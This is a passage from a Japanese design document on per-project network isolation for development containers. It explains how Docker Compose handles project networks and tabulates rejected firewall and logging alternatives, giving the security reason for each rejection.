プロジェクトごとに分ければ、これらは最初から発生しません。コストはほぼゼロです。

### 4.5 Compose だと何が自動で片付くか

Compose は**プロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります**。そのため次がまとめて解決します。

* `initializeCommand` が不要
* `--network` の指定が不要
* プロジェクトごとの分離が自動
* `docker compose down` でネットワークも消えるため、アドレスプールが枯渇しにくく `prune` も不要

Compose を使わない場合は `initializeCommand` でネットワークを用意することになります。ネットワーク名にプロジェクト名を含めれば、**設定文字列を全プロジェクトで同一にしたまま**分離できます。この場合、使い終わったネットワークは自動では消えないため定期的な `docker network prune` が要ります。

どちらの具体的な書き方も [`../README.md`](../README.md) の「ネットワーク構成（推奨）」にあります。

| 案 | 却下の理由 | 詳細 |
|---|---|---|
| ワイルドカードを受理して apex だけ解決 | 「受理するが実現しない」は最悪の性質 | §2.10 |
| GET だけ全ドメイン許可 | GET は書き出しチャネル。かつ L3/L4 では実装不能 | §1.3 |
| nat を退避・復元する | 非特権ユーザーは nat に書けない。守るものが無い | §2.4 |
| `chattr +i` で immutable にする | Docker の既定 capability で不可能。防御価値も限定的 | §2.16 |
| `--cap-add=SYSLOG` でログを読む | ホストと他コンテナのカーネルログが全て読めてしまう | §2.11 |
| `nf_log_all_netns=1` に依存する | 再起動で戻る。全コンテナのログが混ざる。コンテナ外の作業になる | §2.11 |
| `NFLOG` へ移行する | 現状は ipset で足りている。必要になれば検討 | §2.11 |
| ホスト網を包括的に許可する | ホストに Tailscale 網が繋がっている可能性。横移動の経路になる | — |
| sudo 経由でのみ固定パス、`--check-config` には探索を残す | 見に行く場所を増やすほど攻撃面が増える | §2.1 |
